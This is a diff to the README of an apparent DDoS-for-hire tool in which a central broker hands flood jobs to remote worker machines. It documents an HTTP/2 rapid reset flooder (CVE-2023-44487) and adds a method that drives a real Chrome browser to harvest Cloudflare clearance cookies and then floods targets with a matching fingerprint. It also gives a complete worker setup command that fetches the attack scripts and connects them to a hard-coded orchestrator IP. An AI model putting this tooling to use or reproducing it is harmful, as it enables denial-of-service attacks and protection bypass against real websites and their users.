@@ -21,12 +21,12 @@ Telegram: [@fasthttps](https://t.me/fasthttps)
 
 The broker holds the queue and hands each job to an idle connected worker. It never
 spawns a process itself. A worker (`bot/client.js`) connects from any machine, receives
-argv arrays, runs `rapidreset.js` locally, and reports the exit code back over the
-control socket or the result endpoint.
+argv arrays, runs the method script it names locally, and reports the exit code back
+over the control socket or the result endpoint.
 
 ```
 client.js ──HTTP upgrade──▶ index.js ──job──▶ client.js ──spawn──▶ rapidreset.js
-  worker                      broker            worker              flooder
+  worker                      broker            worker              browser.js
 ```
 
 ## Project layout
@@ -61,6 +61,7 @@ api/
 └── bot/
     ├── client.js            worker agent
     ├── rapidreset.js        HTTP/2 flooder
+    ├── browser.js           cf_clearance harvest + browser-matched HTTP/2 flood
     └── proxi.txt            proxy list
 ```
 
@@ -105,10 +106,17 @@ On a worker machine:
 mkdir -p bot && cd bot \
   && curl -fsSLO https://raw.githubusercontent.com/malasahjagotwin/rapidreset-api/main/bot/client.js \
   && curl -fsSLO https://raw.githubusercontent.com/malasahjagotwin/rapidreset-api/main/bot/rapidreset.js \
+  && curl -fsSLO https://raw.githubusercontent.com/malasahjagotwin/rapidreset-api/main/bot/browser.js \
   && curl -fsSLO https://raw.githubusercontent.com/malasahjagotwin/rapidreset-api/main/bot/proxi.txt \
-  && npm i hpack --no-audit --no-fund \
+  && npm i hpack puppeteer-real-browser --no-audit --no-fund \
   && ORCHESTRATOR=http://78.154.103.52:9215 node client.js
 ```
+
+`browser.js` (the `hbrow` method) is the only one that needs `puppeteer-real-browser`:
+it drives a real Chrome to clear the challenge, then reuses that browser's version,
+client hints and cookies for the flood. That package pulls a Chromium of its own, so
+the install is slow; skip it only if you never call `hbrow`. On a headless Linux box
+it also needs `xvfb`, since the bypass runs the browser headed.
 
 Or:
 
@@ -219,9 +227,18 @@ the worker spawns with `shell: false`, so a target cannot inject shell commands.
     "name": "rapidreset",
     "description": "CVE-2023-44487 HTTP/2 rapid reset",
     "argv": ["node", "rapidreset.js", "GET", "<<host>>", "<<time>>", "1", "64", "proxi.txt"]
+  },
+  {
+    "name": "hbrow",
+    "description": "Cloudflare clearance + browser-matched HTTP/2 fingerprint",
+    "argv": ["node", "browser.js", "<<host>>", "<<time>>", "5", "1", "1", "1"]
   }
 ]
 ```
+
+For `hbrow` the four trailing numbers are `rate`, `threads`, `cookieCount` and an extra
+token the script ignores; only `<<host>>` and `<<time>>` come from the job. The clearances
+are harvested once by the master, then handed to every forked worker.
 
 Only `<<host>>`, `<<time>>`, and `<<method>>` are recognized. The worker only executes
 `node`/`nodejs` (mapped to its own `process.execPath`). Legacy `command` strings are
@@ -250,7 +267,7 @@ Startup and runtime logs go through `src/ui/console.js`:
   node        v24.0.0
   listen      0.0.0.0:9215
   local       http://10.0.0.5:9215
-  methods     rapidreset
+  methods     rapidreset, hbrow
   token       worker + api
   ──────────────────────────────────────────────
 
